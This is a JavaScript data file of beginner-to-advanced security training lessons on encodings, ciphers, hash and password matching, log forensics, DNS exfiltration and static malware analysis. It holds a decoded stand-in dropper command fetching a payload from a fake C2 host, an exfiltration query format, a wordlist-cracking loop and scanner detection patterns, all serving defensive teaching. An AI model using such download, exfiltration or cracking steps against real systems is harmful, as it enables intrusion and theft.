/* Learning content, part 2: encoding, crypto, logs and forensics. */
Object.assign(window.LEARN.tracks, {
  b64: {
    level: 'Beginner', time: '45 min', uses: ['base64', 'echo', 'cat'],
    hook: 'Base64 looks like a secret code, but it is just a way to carry any bytes inside plain letters. Everyone who sees it can undo it in one second, and that is exactly the lesson.',
    start: ['Look at the encoded text: letters, digits, + and /, often ending with =.', 'Decode it with base64 -d.', 'For many lines, loop over them, decode each, and grep for the flag.'],
    lessons: [
      { t: 'What base64 is', md: `Computers store bytes. Emails and URLs want letters. Base64 maps every 3 bytes to 4 safe letters. It often ends with one or two **=** as padding.

\`\`\`
$ echo "hello" | base64
aGVsbG8=
$ echo "aGVsbG8=" | base64 -d
hello
\`\`\`

**It is not encryption.** There is no key. If you see it in a config file, the "secret" is out.` },
      { t: 'Many lines, one needle', md: `A file with 40 base64 lines needs a loop:

\`\`\`
$ for l in $(cat lines.b64); do echo $l | base64 -d; done | grep flag
key: flag{...}
\`\`\`

Read it as: for every line, decode it, then keep only the lines that contain "flag".` }
    ]
  },
  layers: {
    level: 'Intermediate', time: '1.5 hours', uses: ['base64', 'xxd', 'rev', 'tr', 'cat'],
    hook: 'Malware authors love to wrap a message in layer after layer, hoping you give up at the second one. You will not. Every layer looks different, and each one comes off with one small tool.',
    start: ['Run cat secret.enc and look at it.', 'Decide which layer it is (see the cheat sheet below).', 'Pipe through the right decoder, then look at the result again.', 'Repeat until you see flag{...}.'],
    lessons: [
      { t: 'Recognise the layer', md: `| It looks like | It is | Undo it with |
|---|---|---|
| letters, digits, + / and a = at the end | base64 | \`base64 -d\` |
| only 0-9 and a-f, even length | hex | \`xxd -r -p\` |
| readable text, but backwards | reversed | \`rev\` |
| letters that almost make words | rot13 | \`tr 'A-Za-z' 'N-ZA-Mn-za-m'\` |

Look at the output after every step: it tells you what the next layer is.` },
      { t: 'Peeling in a pipe', md: `Layers come off in the **reverse** order they were put on. If a message was hex, then reversed, then base64, you undo base64 first:

\`\`\`
$ cat secret.enc | base64 -d | rev | xxd -r -p
flag{...}
\`\`\`

Build the pipe one decoder at a time, and check what comes out before adding the next.` }
    ]
  },
  rot: {
    level: 'Beginner', time: '45 min', uses: ['caesar', 'tr', 'cat'],
    hook: 'Julius Caesar supposedly hid his messages by moving every letter three places along the alphabet. It is the easiest cipher there is, and it still shows up in real malware.',
    start: ['Read the README: it gives the shift, or gives you a word to work it out.', 'To undo a shift of k, shift forward by 26 minus k.', 'cat msg.txt | caesar N.'],
    lessons: [
      { t: 'How the shift works', md: `A shift of 3 turns a into d, b into e, z into c.

\`\`\`
$ echo "attack at dawn" | caesar 3
dwwdfn dw gdzq
\`\`\`

To go back, shift by 26 minus 3, which is 23:

\`\`\`
$ echo "dwwdfn dw gdzq" | caesar 23
attack at dawn
\`\`\`` },
      { t: 'When the shift is unknown', md: `Only 25 shifts exist, so you could try them all. Better: use a clue. If the text starts with the word "the", and its encoded form is "wkh", then t moved to w, which is 3 places, so shift by 23.` }
    ]
  },
  subst: {
    level: 'Intermediate', time: '1 hour', uses: ['tr', 'rev', 'cat'],
    hook: 'A substitution cipher swaps every letter for another with a secret key. Newspapers print them as puzzles. With the key, it is a one-line job.',
    start: ['key.txt holds the cipher alphabet: first letter stands for a, second for b.', 'If the key file is written backwards, run it through rev.', 'cat msg.txt | tr KEY abcdefghijklmnopqrstuvwxyz'],
    lessons: [
      { t: 'tr as a decoder ring', md: `\`tr SET1 SET2\` replaces the first character of SET1 with the first of SET2, the second with the second, and so on.

\`\`\`
$ echo "cde" | tr cde abc
abc
\`\`\`

So to decode, set SET1 to the **cipher alphabet** and SET2 to the normal one.` },
      { t: 'Using the key file', md: `\`\`\`
$ cat key.txt
qwoctfpdzmjyuvxsilgehraknb
$ cat msg.txt | tr qwoctfpdzmjyuvxsilgehraknb abcdefghijklmnopqrstuvwxyz
\`\`\`

If the key is stored backwards, flip it first: \`cat key.txt | rev\`.` }
    ]
  },
  hashmatch: {
    level: 'Intermediate', time: '1 hour', uses: ['md5sum', 'ls', 'grep'],
    hook: 'A hash is a fingerprint: tiny change in a file, completely different fingerprint. If you know a fingerprint, you can find the file it belongs to without opening any of them.',
    start: ['The README gives the target hash.', 'Hash every file in the folder with a loop.', 'grep for the target hash to see which file it belongs to.', 'Submit the file name.'],
    lessons: [
      { t: 'Fingerprints', md: `\`\`\`
$ md5sum a.bin
9e107d9d372bb6826bd81d3542a419d6  a.bin
\`\`\`

Same content always gives the same hash. You cannot get the content back from a hash, but you can check a guess against it.` },
      { t: 'Hash them all', md: `\`\`\`
$ for f in $(ls /srv/blobs); do md5sum /srv/blobs/$f; done | grep 3f2a9c...
3f2a9c...  /srv/blobs/orbit-14f.bin
\`\`\`

The loop prints a hash and path for every file. grep keeps the one that matches.` }
    ]
  },
  wordlist: {
    level: 'Advanced', time: '1.5 hours', uses: ['md5sum', 'echo', 'grep', 'cat'],
    hook: 'Most people pick passwords from a short list of ideas. An attacker does not guess blindly: he hashes the common ones and compares. Do it once and you will never reuse a weak password.',
    start: ['The README gives a hash and tells you how it was made.', 'Loop over wordlist.txt and print each word next to its hash.', 'grep for the target hash, then read the word beside it.'],
    lessons: [
      { t: 'Why weak passwords fail', md: `A system stores a **hash** of your password, not the password. If the hash is unsalted (no random extra), the same password always gives the same hash. So an attacker simply hashes a list of likely passwords and looks for a match.` },
      { t: 'The loop', md: `\`\`\`
$ for w in $(cat wordlist.txt); do echo "$w $(echo $w | md5sum)"; done | grep a6699617...
tundra91 a6699617...  -
\`\`\`

Each line shows the candidate and its hash. The word in front of the matching hash is the password. Real systems fight this with salts and slow hashing.` }
    ]
  },
  weblog: {
    level: 'Intermediate', time: '2 hours', uses: ['grep', 'cut', 'sort', 'uniq', 'awk'],
    hook: 'Every click on a website leaves a line in a log. Security teams read those lines to catch scanners, scrapers and break-ins. You are about to be a web analyst.',
    start: ['Lines look like: ip user [time] METHOD path status bytes.', 'Count the fields: ip is 1, path is 5, status is 6, bytes is 7.', 'Read the README question, pick the matching tool.', 'Add spaces around your pattern so you match a whole field.'],
    lessons: [
      { t: 'Anatomy of a log line', md: `\`\`\`
203.0.113.9 - [10:22:01] GET /login 200 5120
\`\`\`

Fields, split on spaces: **1** ip, **2** user, **3** time, **4** method, **5** path, **6** status, **7** bytes.

Status classes: 2xx fine, 3xx redirect, 4xx the client got it wrong (404 not found, 403 forbidden), 5xx the server broke.` },
      { t: 'Asking questions', md: `\`\`\`
$ grep -c ' 404 ' access.log                      # how many not-found?
$ grep ' /login ' access.log | cut -d' ' -f1 | sort | uniq -c | sort -nr | head -n 1
$ grep ' POST ' access.log | grep ' 500 '           # failed POSTs
$ grep '^203.0.113.9 ' access.log | awk '{s+=$7} END {print s}'   # bytes sent
\`\`\`

The spaces matter: \`' /login '\` will not match \`/login.php\`.` }
    ]
  },
  authlog: {
    level: 'Intermediate', time: '2 hours', uses: ['grep', 'sort', 'uniq', 'cut', 'wc'],
    hook: 'When someone tries to guess your server password, the server writes every attempt down. Read that diary and you can tell a clumsy bot from a patient intruder.',
    start: ['Failed attempts say "Failed password for USER from IP".', 'Successful ones say "Accepted password for USER from IP".', 'grep the word first, then pull out the IP or user.'],
    lessons: [
      { t: 'The shape of an attack', md: `Brute force looks like **many Failed lines from one IP**, often with different user names. The scary line is the **Accepted** one that follows.

\`\`\`
Nov 26 03:14:07 arena sshd[4121]: Failed password for admin from 203.0.113.9 port 51022 ssh2
Nov 26 03:14:09 arena sshd[4123]: Failed password for root from 203.0.113.9 port 51030 ssh2
Nov 26 03:19:41 arena sshd[4190]: Accepted password for deploy from 203.0.113.9 port 51402 ssh2
\`\`\`` },
      { t: 'Pulling out the culprit', md: `\`\`\`
$ grep Failed auth.log | grep -o 'from [0-9.]*' | sort | uniq -c | sort -nr | head -n 1
$ grep Accepted auth.log | grep 203.0.113.9
\`\`\`

\`grep -o\` prints only the matching part, which gives you a clean list to count.` }
    ]
  },
  timeline: {
    level: 'Advanced', time: '1.5 hours', uses: ['cat', 'grep', 'sort', 'head', 'tail'],
    hook: 'Incidents are stories, and stories need order. Four systems each wrote a diary on their own clock. Your job is to merge the diaries into one timeline.',
    start: ['Timestamps like 2026-11-26T10:00:00Z sort correctly as plain text.', 'cat all the logs into one stream, then sort.', 'head gives the earliest event, tail the latest.'],
    lessons: [
      { t: 'ISO timestamps sort for free', md: `Year first, then month, day, hour: alphabetical order equals time order.

\`\`\`
$ cat web.log db.log cache.log auth.log | grep ERROR | sort | head -n 1
\`\`\`` },
      { t: 'Counting inside a time window', md: `To count events in one hour, filter on the hour in the timestamp:

\`\`\`
$ cat web.log db.log cache.log auth.log | grep ERROR | grep -c T10:
\`\`\`` }
    ]
  },
  agents: {
    level: 'Beginner', time: '1 hour', uses: ['cut', 'sort', 'uniq', 'grep', 'wc'],
    hook: 'Every client tells the server what it is: Chrome, curl, a script, a scanner. Honest attackers still leave their tool name behind. Read the name tags.',
    start: ['Each line: client ip, then user agent.', 'cut -d" " -f2 gives only the user agents.', 'Rank them, count them, or grep for a suspect.'],
    lessons: [
      { t: 'Browsers, bots and tools', md: `- Real browsers: Firefox, Chrome, Safari, Edge.
- Search bots: Googlebot, bingbot (honest ones contain "bot").
- Tools: curl, Wget, python-requests, Go-http-client.
- Scanners: sqlmap, Nikto, dirbuster. These are the ones to flag.` },
      { t: 'Quick questions', md: `\`\`\`
$ cut -d' ' -f2 agents.log | sort | uniq -c | sort -nr | head -n 1   # most common
$ grep -E "sqlmap|Nikto" agents.log                                   # the scanners
$ cut -d' ' -f2 agents.log | sort -u | wc -l                          # how many kinds
$ grep -ci bot agents.log                                             # bot traffic
\`\`\`` }
    ]
  },
  dnslog: {
    level: 'Advanced', time: '2 hours', uses: ['grep', 'cut', 'sort', 'tr', 'xxd', 'base64'],
    hook: 'Firewalls often let DNS through, because nothing works without it. So attackers smuggle stolen data out as the names they look up, one chunk at a time. You will pick the chunks out of the crowd and glue them back together.',
    start: ['The README names the suspicious domain and the query shape.', 'grep that domain from the DNS log.', 'cut the query name, sort by the sequence number, cut the hex chunk.', 'Join with tr -d "\\n", then decode with xxd -r -p (and base64 -d on later levels).'],
    lessons: [
      { t: 'Data inside a name', md: `A normal query: \`www.example.com\`. An exfiltration query carries data as a label: \`03.6c61.evil-ab1.test\`. Here \`03\` is the chunk number and \`6c61\` is two bytes of the stolen data, in hex.

A log is full of normal lookups. The trick is to filter on the one suspicious domain.` },
      { t: 'Reassembly line', md: `\`\`\`
$ grep 'evil-ab1.test$' dns.log | cut -d' ' -f4 | sort -t. -k1 -n | cut -d. -f2 | tr -d '\\n' | xxd -r -p
\`\`\`

1. keep queries to the domain, 2. take the query name, 3. order by chunk number, 4. take the hex part, 5. join, 6. turn hex back into text.` }
    ]
  },
  malware: {
    level: 'Advanced', time: '1.5 hours', uses: ['grep', 'cut', 'base64', 'xxd', 'rev', 'tr'],
    hook: 'A malware analyst rarely runs a suspicious file. They read it. This pretend dropper is harmless, but it hides where it calls home, the same way real ones do.',
    start: ['Read sample.sh with cat. Find the line that looks out of place.', 'It may be plain, base64, hex or reversed text, or pieces joined later.', 'Decode it and submit the domain (looks like c2-xxxxx.test).'],
    lessons: [
      { t: 'Never run it, read it', md: `Static analysis means studying a file without running it. In this terminal nothing real runs anyway, but build the habit: **read first**.

Typical hiding tricks: base64 strings piped to \`base64 -d | sh\`, hex piped to \`xxd -r -p\`, text reversed with \`rev\`, and a server name split across variables.` },
      { t: 'Decoding what you find', md: `\`\`\`
$ grep base64 sample.sh | cut -d' ' -f2 | base64 -d
curl -s http://c2-a91fe.test/drop.bin
$ grep '^p' sample.sh | cut -d= -f2 | tr -d '\\n'
c2-a91fe.test
\`\`\`

Ignore decoy lines like \`q1=...\`: they are there to waste your time.` }
    ]
  },
  incident: {
    level: 'Advanced', time: '3 hours', uses: ['grep', 'cut', 'sort', 'uniq', 'cat'],
    hook: 'An alert fires at 3 a.m. Something was stolen. There is no single clue, but a chain: one fact leads to the next. This is what an incident responder does all day.',
    start: ['The README lists numbered steps. Do them in order.', 'Write down the result of each step: it is the input of the next one.', 'The last step ends at a file that holds the flag.'],
    lessons: [
      { t: 'Chains, not clues', md: `A single log line rarely explains an intrusion. You pivot: *attacker IP → what that IP touched → where the data went*. Each answer becomes the next search.` },
      { t: 'Staying organised', md: `Keep a tiny note while you work:

1. attacker ip = ...
2. last file taken = ...
3. file to read = ...

Decoys are everywhere: other IPs, other files with similar names. Quote exact values into your next command.` }
    ]
  }
});
